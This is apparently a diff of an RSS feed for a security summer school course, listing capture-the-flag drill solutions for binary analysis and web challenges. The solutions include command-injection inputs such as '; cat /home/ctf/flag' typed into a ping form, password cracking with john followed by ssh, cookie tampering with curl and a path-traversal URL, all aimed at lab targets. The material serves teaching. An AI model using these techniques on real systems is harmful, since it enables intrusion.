@@ -1,418 +1,782 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Security Summer School –</title><link>/essentials/</link><description>Recent content on Security Summer School</description><generator>Hugo -- gohugo.io</generator><atom:link href="/essentials/index.xml" rel="self" type="application/rss+xml"/><item><title>Essentials:</title><link>/essentials/contributing/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/contributing/</guid><description>
-&lt;h1 id="contributing-to-the-security-essentials-track">Contributing to the Security Essentials Track&lt;/h1>
-&lt;p>We welcome contributions to the content and source code of the Security Essentials Track.
-You may contribute by:&lt;/p>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Security Summer School – Essentials</title><link>/essentials/</link><description>Recent content in Essentials on Security Summer School</description><generator>Hugo -- gohugo.io</generator><atom:link href="/essentials/index.xml" rel="self" type="application/rss+xml"/><item><title>Essentials:</title><link>/essentials/chapters/binary-introduction/assembly-language/drills/crypto/sol/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/binary-introduction/assembly-language/drills/crypto/sol/readme/</guid><description>
+&lt;h1 id="name-crypto">Name: Crypto&lt;/h1>
+&lt;h2 id="vulnerability">Vulnerability&lt;/h2>
+&lt;p>The function that decrypts and prints the flag is in the binary.&lt;/p>
+&lt;h2 id="exploit">Exploit&lt;/h2>
+&lt;p>Just need to call &lt;code>get_flag&lt;/code> from GDB either with &lt;code>jump get_flag&lt;/code> or &lt;code>set $pc=get_flag&lt;/code>.&lt;/p></description></item><item><title>Essentials:</title><link>/essentials/chapters/binary-introduction/assembly-language/drills/in-plain-assembly/sol/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/binary-introduction/assembly-language/drills/in-plain-assembly/sol/readme/</guid><description>
+&lt;h1 id="name-in-plain-assembly">Name: In Plain Assembly&lt;/h1>
+&lt;h2 id="vulnerability">Vulnerability&lt;/h2>
+&lt;p>The binary verifies the flag byte by byte in the &lt;code>verify_flag&lt;/code> function.
+Before being verified, each byte is multiplied by 2 and then 1 is added to it.&lt;/p>
+&lt;h2 id="exploit">Exploit&lt;/h2>
+&lt;p>Use Ghidra or GDB to decode the values of each letter &lt;code>* 2 + 1&lt;/code> then do the math to find the original letters&lt;/p></description></item><item><title>Essentials:</title><link>/essentials/chapters/binary-introduction/assembly-language/drills/jump-maze/sol/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/binary-introduction/assembly-language/drills/jump-maze/sol/readme/</guid><description>
+&lt;h1 id="name-jump-maze">Name: Jump Maze&lt;/h1>
+&lt;h2 id="vulnerability">Vulnerability&lt;/h2>
+&lt;p>Each letter of the flag is written to a register in &lt;code>flag_maze.o&lt;/code>.
+After each &lt;code>mov&lt;/code> there is a &lt;code>jmp&lt;/code> to another snippet that writes another letter.&lt;/p>
+&lt;h2 id="exploit">Exploit&lt;/h2>
+&lt;p>Start from the first instruction, decode the bytes written to the registers and follow the &lt;code>jmp&lt;/code>s to find the flag.&lt;/p></description></item><item><title>Essentials:</title><link>/essentials/chapters/binary-introduction/assembly-language/slides/assembly-language/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/binary-introduction/assembly-language/slides/assembly-language/</guid><description>
+&lt;h1 id="assembly-language">Assembly Language&lt;/h1></description></item><item><title>Essentials:</title><link>/essentials/chapters/binary-introduction/binary-analysis/drills/easy-to-spot/sol/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/binary-introduction/binary-analysis/drills/easy-to-spot/sol/readme/</guid><description>
+&lt;h1 id="easy-to-spot-solution">Easy to Spot Solution&lt;/h1>
+&lt;p>The easies way to find the flag is by using the &lt;code>strings&lt;/code> tool, as the flag is stored in plaintext in a variable.&lt;/p></description></item><item><title>Essentials:</title><link>/essentials/chapters/binary-introduction/binary-analysis/drills/ghidra-killer/sol/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/binary-introduction/binary-analysis/drills/ghidra-killer/sol/readme/</guid><description>
+&lt;h1 id="ghidra-killer-solution">Ghidra Killer Solution&lt;/h1>
+&lt;p>As the name says, &lt;code>Ghidra&lt;/code> will crash if used on the binary.
+&lt;code>Strings&lt;/code> is useless, because the binary reads the flag from a file.
+&lt;code>GDB&lt;/code> is also useless (and will also crash).
+The only way is to use &lt;code>strace&lt;/code>, to see what the program actually does.&lt;/p>
+&lt;p>We can see an &lt;code>openat()&lt;/code> call, which gives us the path to the flag.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>openat&lt;span style="color:#ce5c00;font-weight:bold">(&lt;/span>AT_FDCWD, &lt;span style="color:#4e9a06">&amp;#34;flag&amp;#34;&lt;/span>, O_RDONLY&lt;span style="color:#ce5c00;font-weight:bold">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Essentials:</title><link>/essentials/chapters/binary-introduction/binary-analysis/drills/packaging-is-important/sol/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/binary-introduction/binary-analysis/drills/packaging-is-important/sol/readme/</guid><description>
+&lt;h1 id="packaging-is-important-solution">Packaging is Important Solution&lt;/h1>
+&lt;p>The &amp;ldquo;binary&amp;rdquo; isn&amp;rsquo;t actually a binary.
+Use &lt;code>file&lt;/code> to find out that it is actually a &lt;code>.zip&lt;/code> archive.
+Use &lt;code>unzip&lt;/code> to extract the actual binary.&lt;/p></description></item><item><title>Essentials:</title><link>/essentials/chapters/binary-introduction/binary-analysis/drills/spaghetti/sol/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/binary-introduction/binary-analysis/drills/spaghetti/sol/readme/</guid><description>
+&lt;h1 id="spaghetti-solution">Spaghetti Solution&lt;/h1>
+&lt;p>The binary asks for a number.
+After the number is provided, the program will call a function, depending on that number.
+In this task, you must use &lt;code>Ghidra&lt;/code> to follow the function-call graph, to find the right starting function, and then the number required.&lt;/p>
+&lt;p>&lt;code>fn11()&lt;/code> is the target function.&lt;/p>
+&lt;p>The function call sequence, that ends with &lt;code>fn11()&lt;/code> is the following:
+&lt;code>fn37()&lt;/code> -&amp;gt; &lt;code>fn28()&lt;/code> -&amp;gt; &lt;code>fn30()&lt;/code> -&amp;gt; &lt;code>fn11()&lt;/code>.&lt;/p>
+&lt;p>&lt;code>fn37()&lt;/code> is called by enetring the &lt;code>38&lt;/code> number.&lt;/p></description></item><item><title>Essentials:</title><link>/essentials/chapters/binary-introduction/binary-analysis/slides/binary-analysis/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/binary-introduction/binary-analysis/slides/binary-analysis/</guid><description>
+&lt;h1 id="binary-analysis">Binary Analysis&lt;/h1></description></item><item><title>Essentials:</title><link>/essentials/chapters/binary-introduction/overview/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/binary-introduction/overview/readme/</guid><description>
+&lt;h1 id="binary-introduction">Binary Introduction&lt;/h1></description></item><item><title>Essentials:</title><link>/essentials/chapters/binary-introduction/overview/slides/binary-introduction/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/binary-introduction/overview/slides/binary-introduction/</guid><description>
+&lt;h1 id="binary-introduction">Binary Introduction&lt;/h1></description></item><item><title>Essentials:</title><link>/essentials/chapters/binary-introduction/taming-the-stack/slides/taming-the-stack/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/binary-introduction/taming-the-stack/slides/taming-the-stack/</guid><description>
+&lt;h1 id="taming-the-stack">Taming The Stack&lt;/h1></description></item><item><title>Essentials:</title><link>/essentials/chapters/data-and-application-lifetime/application-lifetime/drills/secretive-binary/sol/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/data-and-application-lifetime/application-lifetime/drills/secretive-binary/sol/readme/</guid><description>
+&lt;h1 id="challenge-secretive">Challenge: Secretive&lt;/h1>
+&lt;p>We have a binary, &lt;code>secretive&lt;/code>, and a header file, &lt;code>hide_flag.h&lt;/code>.
+The header file contains a single function, that takes a &lt;code>flag&lt;/code> parameter.
+When running the binary, it prints &amp;ldquo;No&amp;rdquo;.
+The solution is to overload the &lt;code>print_flag&lt;/code> function, with one that displays the actual received parameter, as shown in the &lt;code>my-own-puts&lt;/code> activity.&lt;/p></description></item><item><title>Essentials:</title><link>/essentials/chapters/data-and-application-lifetime/application-lifetime/slides/application-lifetime/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/data-and-application-lifetime/application-lifetime/slides/application-lifetime/</guid><description>
+&lt;h1 id="application-lifetime">Application Lifetime&lt;/h1></description></item><item><title>Essentials:</title><link>/essentials/chapters/data-and-application-lifetime/data-representation/slides/data-representation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/data-and-application-lifetime/data-representation/slides/data-representation/</guid><description>
+&lt;h1 id="data-representation">Data Representation&lt;/h1></description></item><item><title>Essentials:</title><link>/essentials/chapters/data-and-application-lifetime/data-security/slides/data-security/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/data-and-application-lifetime/data-security/slides/data-security/</guid><description>
+&lt;h1 id="data-security">Data Security&lt;/h1></description></item><item><title>Essentials:</title><link>/essentials/chapters/data-and-application-lifetime/overview/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/data-and-application-lifetime/overview/readme/</guid><description>
+&lt;h1 id="data-and-application-lifetime">Data and Application Lifetime&lt;/h1></description></item><item><title>Essentials:</title><link>/essentials/chapters/data-and-application-lifetime/overview/slides/data-and-application-lifetime/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/data-and-application-lifetime/overview/slides/data-and-application-lifetime/</guid><description>
+&lt;h1 id="data-and-application-lifetime">Data and Application Lifetime&lt;/h1></description></item><item><title>Essentials:</title><link>/essentials/chapters/demystifying-web/explaining-the-internet/drills/pinger/sol/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/demystifying-web/explaining-the-internet/drills/pinger/sol/readme/</guid><description>
+&lt;h1 id="pinger-solution">Pinger: Solution&lt;/h1>
+&lt;h2 id="vulnerability">Vulnerability&lt;/h2>
+&lt;p>The &lt;code>ping&lt;/code> server calls &lt;code>subprocess.Popen('ping -c 1 ' + user_input)&lt;/code>.
+This leaves it vulnerable to a command injection attack.&lt;/p>
+&lt;h2 id="exploit">Exploit&lt;/h2>
+&lt;p>Frist do some recon and use &lt;code>; ls&lt;/code> to explore the remote system.
+If you do it well, you&amp;rsquo;ll find the flag in &lt;code>/home/ctf&lt;/code>.
+Now use &lt;code>; cat /home/ctf/flag&lt;/code> to read it.&lt;/p></description></item><item><title>Essentials:</title><link>/essentials/chapters/demystifying-web/explaining-the-internet/drills/unaccessible/sol/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/demystifying-web/explaining-the-internet/drills/unaccessible/sol/readme/</guid><description>
+&lt;h1 id="unaccessible-solution">Unaccessible: Solution&lt;/h1>
+&lt;h2 id="vulnerability">Vulnerability&lt;/h2>
+&lt;p>The server&amp;rsquo;s password is weak (&lt;code>stupid&lt;/code>) and is included in &lt;code>john&lt;/code>&amp;rsquo;s worldist (&lt;code>password.lst&lt;/code>).&lt;/p>
+&lt;h2 id="exploit">Exploit&lt;/h2>
+&lt;p>Use &lt;code>john&lt;/code> to find the password using its default worldist.
+Then use this password to &lt;code>ssh&lt;/code> into the container and read the flag from &lt;code>/home/ctf&lt;/code>&lt;/p></description></item><item><title>Essentials:</title><link>/essentials/chapters/demystifying-web/explaining-the-internet/slides/explaining-the-internet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/demystifying-web/explaining-the-internet/slides/explaining-the-internet/</guid><description>
+&lt;h1 id="explaining-the-internet">Explaining the Internet&lt;/h1></description></item><item><title>Essentials:</title><link>/essentials/chapters/demystifying-web/hacking-the-web/drills/chef-hacky-mchack/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/demystifying-web/hacking-the-web/drills/chef-hacky-mchack/readme/</guid><description>
+&lt;h2 id="virgin-from-the-browser">Virgin: From the Browser&lt;/h2>
+&lt;p>We visit to the URL, open the Developer Tools and go over to the &amp;ldquo;Storage&amp;rdquo; tab.
+There we see the server has given ass the cookie &lt;code>u=guest&lt;/code>.&lt;/p>
+&lt;p>&lt;img src="../../assets/hacky-mchack-cookies.png" alt="Hacky McHack - Initial Cookie">&lt;/p>
+&lt;p>Since the challenge is called &amp;ldquo;Hacky McHack&amp;rdquo; we set the cookie value to &lt;code>hacky mchack&lt;/code>.
+We notice a new tab has appeared at the top of the page or by inspecting the HTML source: &lt;strong>Manage&lt;/strong> (&lt;code>/manage.php&lt;/code>).
+We click on it and get the flag.&lt;/p>
+&lt;pre tabindex="0">&lt;code>&amp;lt;ul class=&amp;#34;nav-menu list-unstyled&amp;#34;&amp;gt;
+&amp;lt;li&amp;gt;&amp;lt;a href=&amp;#34;index.php&amp;#34; class=&amp;#34;smoothScroll&amp;#34;&amp;gt;Home&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
+&amp;lt;li&amp;gt;&amp;lt;a href=&amp;#34;#about&amp;#34; class=&amp;#34;smoothScroll&amp;#34;&amp;gt;About&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
+&amp;lt;li&amp;gt;&amp;lt;a href=&amp;#34;#portfolio&amp;#34; class=&amp;#34;smoothScroll&amp;#34;&amp;gt;Portfolio&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
+&amp;lt;li&amp;gt;&amp;lt;a href=&amp;#34;#journal&amp;#34; class=&amp;#34;smoothScroll&amp;#34;&amp;gt;Blog&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
+&amp;lt;li&amp;gt;&amp;lt;a href=&amp;#34;#contact&amp;#34; class=&amp;#34;smoothScroll&amp;#34;&amp;gt;Contact&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
+&amp;lt;li&amp;gt;&amp;lt;a href=&amp;#34;manage.php&amp;#34; class=&amp;#34;smoothScroll&amp;#34;&amp;gt;Manage&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
+&amp;lt;/ul&amp;gt;
+&lt;/code>&lt;/pre>&lt;h2 id="chad-v1-from-the-cli">Chad v1: From the CLI&lt;/h2>
+&lt;p>We use our good friend &lt;code>curl&lt;/code>.
+First, we save the cookies from the initial page into a cookie jar.&lt;/p>
+&lt;pre tabindex="0">&lt;code>root@kali:~# curl -c cookies.txt http://141.85.224.70:8010
+[...]
+root@kali:~# cat cookies.txt
+# Netscape HTTP Cookie File
+# https://curl.haxx.se/docs/http-cookies.html
+# This file was generated by libcurl! Edit at your own risk.
+http://141.85.224.70:8010 FALSE / FALSE 1656864260 u guest
+&lt;/code>&lt;/pre>&lt;p>Now we edit the file and replace &lt;code>guest&lt;/code> with &lt;code>hacky mchack&lt;/code> and send a &lt;code>GET&lt;/code> request to &lt;code>/manage.php&lt;/code>.&lt;/p>
+&lt;pre tabindex="0">&lt;code>root@kali:~# sed -i s/guest/hacky\ mchack/ cookies.txt
+root@kali:~# curl -b cookies.txt http://141.85.224.70:8010/manage.php
+&lt;/code>&lt;/pre>&lt;p>If we didn&amp;rsquo;t want to use the cookie jar, we could have simply looked at the headers sent by the server then sent the cookie &amp;ldquo;manually&amp;rdquo;:&lt;/p>
+&lt;pre tabindex="0">&lt;code>root@kali:~# curl -v http://141.85.224.70:8010 &amp;gt; /dev/null # we don&amp;#39;t care about the output
+[...]
+&amp;lt; HTTP/1.1 200 OK
+&amp;lt; Date: Sun, 03 Jul 2022 16:10:51 GMT
+&amp;lt; Server: Apache/2.4.38 (Debian)
+&amp;lt; X-Powered-By: PHP/7.2.34
+&amp;lt; Set-Cookie: u=guest; expires=Sun, 03-Jul-2022 16:11:51 GMT; Max-Age=60
+root@kali:~# curl -b &amp;#39;u=hacky mchack&amp;#39; $URL/manage.php # Notice the Set-Cookie field above
+&amp;lt;here we get the flag&amp;gt;
+&lt;/code>&lt;/pre>&lt;h2 id="chad-v2-from-python">Chad v2: From Python&lt;/h2>
+&lt;p>Simply create a &lt;code>Session&lt;/code> object, set the cookie &lt;code>u&lt;/code> to &lt;code>hacky mchack&lt;/code>, then send a &lt;code>GET&lt;/code> request to the &lt;code>/manage.php&lt;/code> endpoint.&lt;/p></description></item><item><title>Essentials:</title><link>/essentials/chapters/demystifying-web/hacking-the-web/drills/nobody-loves-me/sol/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/demystifying-web/hacking-the-web/drills/nobody-loves-me/sol/readme/</guid><description>
+&lt;h1 id="-name-nobody-loves-me"># Name: Nobody Loves Me&lt;/h1>
+&lt;h2 id="vulnerability">Vulnerability&lt;/h2>
+&lt;p>The flag is displayed only if the &lt;code>ernqsvyr()&lt;/code> function is called from the Developer Tools.&lt;/p>
+&lt;h2 id="exploit">Exploit&lt;/h2>
+&lt;p>Look at the source code of &lt;code>index.html&lt;/code>.
+At the end, you&amp;rsquo;ll find a JavaScript function.
+Call it in the Developer Tools console to get the flag.&lt;/p></description></item><item><title>Essentials:</title><link>/essentials/chapters/demystifying-web/hacking-the-web/drills/traverse-universe/sol/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/demystifying-web/hacking-the-web/drills/traverse-universe/sol/readme/</guid><description>
+&lt;h1 id="name-traverse-universe">Name: Traverse universe&lt;/h1>
+&lt;h2 id="vulnerability">Vulnerability&lt;/h2>
+&lt;p>Path Traversal in URL path.&lt;/p>
+&lt;h2 id="exploit">Exploit&lt;/h2>
+&lt;p>Check the source code if &lt;code>index.html&lt;/code>.
+There you&amp;rsquo;ll find the following line:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&amp;lt;!--&amp;lt;script&amp;gt;var _0x5c09=[&amp;#39;dot-php&amp;#39;,&amp;#39;earth\x20&amp;#39;,&amp;#39;log&amp;#39;,&amp;#39;slash\x20&amp;#39;,&amp;#39;dot-dot-slash\x20&amp;#39;,&amp;#39;flag\x20&amp;#39;,&amp;#39;NASA\x20&amp;#39;];(function(_0xe916b7,_0x5c0933){var _0x34f1b0=function(_0x4a989c){while(--_0x4a989c){_0xe916b7[&amp;#39;push&amp;#39;](_0xe916b7[&amp;#39;shift&amp;#39;]());}};_0x34f1b0(++_0x5c0933);}(_0x5c09,0xa1));var _0x34f1=function(_0xe916b7,_0x5c0933){_0xe916b7=_0xe916b7-0x0;var _0x34f1b0=_0x5c09[_0xe916b7];return _0x34f1b0;};var algf=_0x34f1(&amp;#39;0x4&amp;#39;)+_0x34f1(&amp;#39;0x1&amp;#39;)+_0x34f1(&amp;#39;0x3&amp;#39;)+&amp;#39;moon\x20&amp;#39;+&amp;#39;slash\x20&amp;#39;+_0x34f1(&amp;#39;0x6&amp;#39;)+_0x34f1(&amp;#39;0x3&amp;#39;)+_0x34f1(&amp;#39;0x5&amp;#39;)+_0x34f1(&amp;#39;0x0&amp;#39;);console[_0x34f1(&amp;#39;0x2&amp;#39;)](algf);&amp;lt;/script&amp;gt;--&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Executing the script in the console reveals the path to the flag:&lt;/p>
+&lt;pre tabindex="0">&lt;code>dot-dot-slash earth slash moon slash NASA slash flag dot-php
+&lt;/code>&lt;/pre>&lt;p>Open this URL in your browser: http://141.85.224.102:8015/panetarium/../earth/moon/NASA/flag.php.&lt;/p></description></item><item><title>Essentials:</title><link>/essentials/chapters/demystifying-web/hacking-the-web/slides/hacking-the-web/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/demystifying-web/hacking-the-web/slides/hacking-the-web/</guid><description>
+&lt;h1 id="hacking-the-web">Hacking the Web&lt;/h1></description></item><item><title>Essentials:</title><link>/essentials/chapters/demystifying-web/overview/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/demystifying-web/overview/readme/</guid><description>
+&lt;h1 id="demystifying-web">Demystifying Web&lt;/h1></description></item><item><title>Essentials:</title><link>/essentials/chapters/demystifying-web/overview/slides/demystifying-web/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/demystifying-web/overview/slides/demystifying-web/</guid><description>
+&lt;h1 id="demystifying-web">Demystifying Web&lt;/h1></description></item><item><title>Essentials:</title><link>/essentials/chapters/demystifying-web/rediscovering-the-browser/drills/one-more-pinger/sol/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/demystifying-web/rediscovering-the-browser/drills/one-more-pinger/sol/readme/</guid><description>
+&lt;h1 id="name-one-more-pinger">Name: One More Pinger&lt;/h1>
+&lt;h2 id="vulnerability">Vulnerability&lt;/h2>
+&lt;p>The &lt;code>pinger&lt;/code> server calls &lt;code>subprocess.Popen('ping -c 1 ' + user_input)&lt;/code>.
+This leaves it vulnerable to a command injection attack.&lt;/p>
+&lt;h2 id="exploit">Exploit&lt;/h2>
+&lt;p>First, get the HTML content of the website:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>root@kali:~# curl http://141.85.224.70:8069/pinger
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">&amp;lt;&lt;/span>&lt;span style="color:#204a87;font-weight:bold">html&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">&amp;lt;&lt;/span>&lt;span style="color:#204a87;font-weight:bold">head&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">&amp;lt;&lt;/span>&lt;span style="color:#204a87;font-weight:bold">title&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>Pinger&lt;span style="color:#000;font-weight:bold">&amp;lt;/&lt;/span>&lt;span style="color:#204a87;font-weight:bold">title&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">&amp;lt;/&lt;/span>&lt;span style="color:#204a87;font-weight:bold">head&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">&amp;lt;&lt;/span>&lt;span style="color:#204a87;font-weight:bold">h2&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>My purpose is simple: I check the availability of network hosts by pinging their IP. Use the text box below to give me an IP to ping.&lt;span style="color:#000;font-weight:bold">&amp;lt;/&lt;/span>&lt;span style="color:#204a87;font-weight:bold">h2&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">&amp;lt;&lt;/span>&lt;span style="color:#204a87;font-weight:bold">form&lt;/span> &lt;span style="color:#c4a000">action&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;/ping&amp;#34;&lt;/span> &lt;span style="color:#c4a000">method&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;get&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> IP: &lt;span style="color:#000;font-weight:bold">&amp;lt;&lt;/span>&lt;span style="color:#204a87;font-weight:bold">input&lt;/span> &lt;span style="color:#c4a000">type&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;text&amp;#34;&lt;/span> &lt;span style="color:#c4a000">name&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;ip&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&amp;lt;/&lt;/span>&lt;span style="color:#204a87;font-weight:bold">br&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">&amp;lt;&lt;/span>&lt;span style="color:#204a87;font-weight:bold">input&lt;/span> &lt;span style="color:#c4a000">type&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;submit&amp;#34;&lt;/span> &lt;span style="color:#c4a000">value&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;Submit&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">&amp;lt;/&lt;/span>&lt;span style="color:#204a87;font-weight:bold">form&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">&amp;lt;/&lt;/span>&lt;span style="color:#204a87;font-weight:bold">html&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The IP is retrieved from the user via this &lt;code>form&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">&amp;lt;&lt;/span>&lt;span style="color:#204a87;font-weight:bold">form&lt;/span> &lt;span style="color:#c4a000">action&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;/ping&amp;#34;&lt;/span> &lt;span style="color:#c4a000">method&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;get&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> IP: &lt;span style="color:#000;font-weight:bold">&amp;lt;&lt;/span>&lt;span style="color:#204a87;font-weight:bold">input&lt;/span> &lt;span style="color:#c4a000">type&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;text&amp;#34;&lt;/span> &lt;span style="color:#c4a000">name&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;ip&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&amp;lt;/&lt;/span>&lt;span style="color:#204a87;font-weight:bold">br&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">&amp;lt;&lt;/span>&lt;span style="color:#204a87;font-weight:bold">input&lt;/span> &lt;span style="color:#c4a000">type&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;submit&amp;#34;&lt;/span> &lt;span style="color:#c4a000">value&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;Submit&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
